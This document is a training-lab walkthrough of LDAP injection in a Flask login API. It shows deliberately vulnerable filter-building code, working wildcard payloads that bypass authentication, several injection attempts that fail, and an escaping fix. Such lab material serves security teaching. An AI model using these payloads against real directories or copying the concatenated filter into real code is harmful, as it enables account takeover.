# Walkthrough — ldap-injection

## 1. Context

The app is a corporate login API. You `POST /login` a `user` and a `password`, and the server authenticates them against an **LDAP directory** — a hierarchical database of identities (think OpenLDAP or Active Directory, the backbone of corporate logins). It builds one **search filter** and considers you authenticated if the search returns at least one entry:

```
(&(uid=<user>)(userPassword=<password>))
```

A few terms, because the whole exploit lives in them:

- A directory stores entries, each named by a **DN** (Distinguished Name) — a unique path like `uid=jdoe,ou=people,dc=example,dc=com`. Entries have **attributes**: `uid` (the login name), `cn` (full name), `ou`/`dc` (organizational/domain components), `userPassword`.
- A **search filter** (RFC 4515) is the string that says *which* entries to match. It uses **prefix notation**: `(&(A)(B))` means "A **AND** B", `(|(A)(B))` means "A **OR** B", `(!(A))` means "**NOT** A". A valid filter is exactly one balanced expression at the top level.
- The characters `*`, `(`, `)` and `\` are **metacharacters** — filter *syntax*, not data. `*` is a **wildcard**: on its own, `(userPassword=*)` is a *presence* test — "the entry has a `userPassword`", any value at all.

So the filter above means "match the entry whose `uid` is _user_ **and** whose `userPassword` is _password_." This is **LDAP injection**, under **A03 — Injection** on the OWASP Top 10: untrusted input reaching a query interpreter — here the directory's filter engine — that treats it as structure, not inert data. Because the app pastes your input straight into the filter string, a metacharacter you send is read as filter logic.

Topology: a shared `ldap` directory (no host port) plus `vulnerable` on `127.0.0.1:8028` and `fixed` on `127.0.0.1:8128`. This is an **API — there is no browser track.** Every request below is a block you paste into **Burp Repeater**; the same requests run under `curl`. The proof is the login response itself.

## 2. Spot the bug

Open [`vulnerable/app.py`](./vulnerable/app.py). The login view is short:

```python
@app.route("/login", methods=["POST"])
def login():
    body = request.get_json(silent=True) or {}
    user = body.get("user", "")
    password = body.get("password", "")
    # VULNERABLE: user/password are concatenated straight into the LDAP filter...
    filt = f"(&(uid={user})(userPassword={password}))"
    print("LDAP search filter:", filt, flush=True)
    conn = Connection(server, BIND_DN, BIND_PW, auto_bind=True)
    conn.search(PEOPLE_DN, filt, search_scope=SUBTREE, attributes=["uid"])
    if conn.entries:
        return jsonify({"authenticated": True, "uid": str(conn.entries[0].uid)})
    return jsonify({"authenticated": False}), 401
```

The filter is built with an f-string, and `user`/`password` come straight from the request body. Two things stand out. First, the auth decision is `if conn.entries` — "the search returned something, so you're in" — which never checks a password, it checks whether a *filter matched*. Second, the value you control is pasted into a string that has *syntax*. Ask the auditor's question: *this `password` I control lands inside a filter — what if I send a metacharacter instead of a value?* Then it becomes filter structure.

(The app prints the filter it builds, so you can watch what your input turns into: `docker compose logs vulnerable`.)

## 3. Exploitation via Burp Suite

Point Burp at the vulnerable API on `127.0.0.1:8028` and work from Repeater. The seeded passwords are visible in [`ldap/seed.ldif`](./ldap/seed.ldif), so the baseline can use a real one; the attack won't need it.

### Baseline — the login working normally

A real string credential authenticates:

```
POST /login HTTP/1.1
Host: 127.0.0.1:8028
Content-Type: application/json

{"user": "admin", "password": "s3cr3t-admin-pw"}
```

Response — `200`:

```json
{"authenticated": true, "uid": "admin"}
```

The app built exactly what you'd expect, and it matched:

```
(&(uid=admin)(userPassword=s3cr3t-admin-pw))
```

A wrong password matches nothing and is rejected — `{"user": "admin", "password": "wrongpw"}` returns `401 {"authenticated": false}`. Hold onto that: with real string values, the filter is two literal equality tests, and the password one has to be right.

### Step 1 — Send a metacharacter instead of a password

Instead of a password string, send the single character `*`:

```
POST /login HTTP/1.1
Host: 127.0.0.1:8028
Content-Type: application/json

{"user": "admin", "password": "*"}
```

Response — `200`:

```json
{"authenticated": true, "uid": "admin"}
```

You logged in as `admin` without the password. The filter the app actually ran was:

```
(&(uid=admin)(userPassword=*))
```

`*` in a value position is not the literal character "star" — it is the LDAP **wildcard**, and `(userPassword=*)` is a **presence** test: "the entry has *any* `userPassword`." Since `admin` has one, the filter matches, the search returns the entry, and `if conn.entries` calls you authenticated. The password check didn't *fail* — the `*` *rewrote it*, from "equals this value" to "exists at all."

You can pin any account by putting the wildcard in both fields. `{"user": "*", "password": "*"}` builds `(&(uid=*)(userPassword=*))`, matches every user, and logs you in as the first one the directory returns:

```json
{"authenticated": true, "uid": "jdoe"}
```

The lab is isolated — the apps bind to `127.0.0.1` and the `ldap` container has no host port at all — and the payload is benign: it only subverts a `search` to prove the bypass, writing and modifying nothing in the directory. The seeded users are fake.

## 4. What the vuln is NOT

The exploit is one character, and that can steer you toward the wrong fix. Kill the wrong conclusions.

**It is not a "weird character" input-validation bug.** The instinct is "just forbid `*` and parentheses in the `user` field." That is a blocklist, and blocklists chase the *shape* of the attack — alternate encodings, metacharacters you didn't list, fields that legitimately contain symbols. The cause is not that the attacker typed `*`; it is that the app concatenated an untrusted value into a filter *as structure*. The fix is to **escape** the metacharacters at the point of use, so no character in the input is ever read as syntax (§6).

**It is not the NoSQL injection from `nosql-injection-mongo` (22).** Both are A03 injection into a query language that isn't SQL, but the engine and the mechanism differ. There, the input changed *type* — a JSON object `{"$ne": null}` smuggled a Mongo operator — and the fix was to force the type. Here the input stays a string; it is a *metacharacter inside a concatenated filter*. Prove the difference by sending the Mongo payload as the password:

```
{"user": "admin", "password": {"$ne": null}}
```

It fails (`401`). `ldap3` gets a value, renders it into the filter as the literal text `(&(uid=admin)(userPassword={'$ne': None}))`, and searches for a password equal to that string; there is no `$` operator engine to interpret. The SQL reflex fails too — `{"user": "admin", "password": "' OR 1=1 --"}` also returns `401`, because there is no quoted SQL command to break out of, just a literal password that matches no one. And notice the **fix inverts** between the two atoms: escaping is exactly right *here*, but was the *wrong* fix for the type confusion in 22.

**You cannot inject arbitrary filter clauses here.** The classic LDAP-injection move is to reopen parentheses and graft on an `OR` — `{"user": "*)(uid=*))(|(uid=*", "password": "x"}`. Try it and the app returns `500`: `ldap3` builds `(&(uid=*)(uid=*))(|(uid=*)(userPassword=x))`, sees two top-level filters, and refuses with `LDAPInvalidFilterError: missing boolean operator in filter`. `ldap3` requires a single well-formed filter, so the vector that works here is a metacharacter in the *value* position — the `*` wildcard — not grafted-on structure.

**It is not RCE.** It subverts the directory query to bypass authentication; nothing runs code.

**The isolation proof.** A real login with correct credentials and no metacharacters behaves *identically* on both ports (`200`, `uid: admin`); a wrong credential is `401` on both. Only the metacharacter payload separates the vulnerable app (`200`) from the fixed one (`401`).

## 5. Impact

Authentication bypass — you log in as `admin` without a credential, which grants everything `admin` can reach in the victim's context. That is the same ceiling as an auth bypass through SQL injection (`sqli-union-basic` subverts a SQL query to the same end; this subverts an LDAP filter), reached through a different engine. It is not RCE. LDAP injection has other faces in the wild — manipulating a filter to read back attributes the query was never meant to expose — but this atom models the auth-bypass face and claims no more.

## 6. Why the fix works

Run the same requests against the fixed API on port **8128** (see [`DIFF.md`](./DIFF.md) for the change).

The `*` payload is rejected:

```
POST /login HTTP/1.1
Host: 127.0.0.1:8128
Content-Type: application/json

{"user": "admin", "password": "*"}
```

Response — `401`:

```json
{"authenticated": false}
```

The fixed app ran:

```
(&(uid=admin)(userPassword=\2a))
```

`escape_filter_chars` turned the `*` into its RFC 4515 escape `\2a` — the literal character, no longer a wildcard. The filter now searches for an account whose `userPassword` is exactly the one-character string `*`, which nobody has, so the search returns nothing and the login is refused. An escaped `(`, `)` or `\` is neutralized the same way (`\28`, `\29`, `\5c`).

And the feature is untouched: the real string credential (`{"user": "admin", "password": "s3cr3t-admin-pw"}`) still returns `200` on 8128, exactly as on the vulnerable app — its value has no metacharacters, so escaping changes nothing. The feature is identical; only the metacharacter payload separates the two. The fix **escapes the input** — it does not blocklist characters, and it does not swap the fragile "the search matched, so you're in" design for a real **bind** (connecting to the directory as that user's own DN with the supplied password, which is how directory auth should actually be checked). [`DIFF.md`](./DIFF.md) walks through why those alternatives are the wrong shape.
